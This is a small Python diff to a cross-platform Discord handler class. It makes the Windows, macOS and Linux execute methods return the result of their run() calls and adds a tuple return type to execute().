@@ -17,7 +17,7 @@ class Discord(PlatformHandlerBase):
         ]
 
         discord = DiscordWindows(windowsPaths)
-        discord.run()
+        return discord.run()
 
     def execute_macos(self):
         from modules.discord.discord_mac import DiscordMac
@@ -31,8 +31,7 @@ class Discord(PlatformHandlerBase):
         ]
 
         discord = DiscordMac(macPaths)
-        discord.run()
-        pass
+        return discord.run()
 
     def execute_linux(self):
         from modules.discord.discord_linux import DiscordLinux
@@ -46,8 +45,7 @@ class Discord(PlatformHandlerBase):
         ]
 
         discord = DiscordLinux(linuxPaths)
-        discord.run()
-        pass
+        return discord.run()
 
-    def execute(self):
-        super().execute()
+    def execute(self) -> tuple:
+        return super().execute()
